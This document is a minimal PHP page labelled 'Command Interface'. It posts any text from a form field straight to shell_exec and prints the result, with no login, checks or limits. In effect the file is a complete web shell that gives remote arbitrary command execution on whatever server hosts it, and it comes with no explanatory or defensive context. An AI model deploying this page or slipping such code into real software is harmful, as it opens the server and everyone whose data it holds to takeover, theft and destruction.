
<!DOCTYPE html>
<html>
<head>
    <title>Command Interface</title>
</head>
<body>
    <h2>Command Interface</h2>

    <form method="POST">
        <input type="text" name="command"
               placeholder="Enter a command" required>
        <button type="submit">Run</button>
    </form>

    <pre><?php
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        $command = $_POST["command"] ?? "";
        $output = shell_exec($command);
        echo $output;
    }
    ?></pre>
</body>
</html>

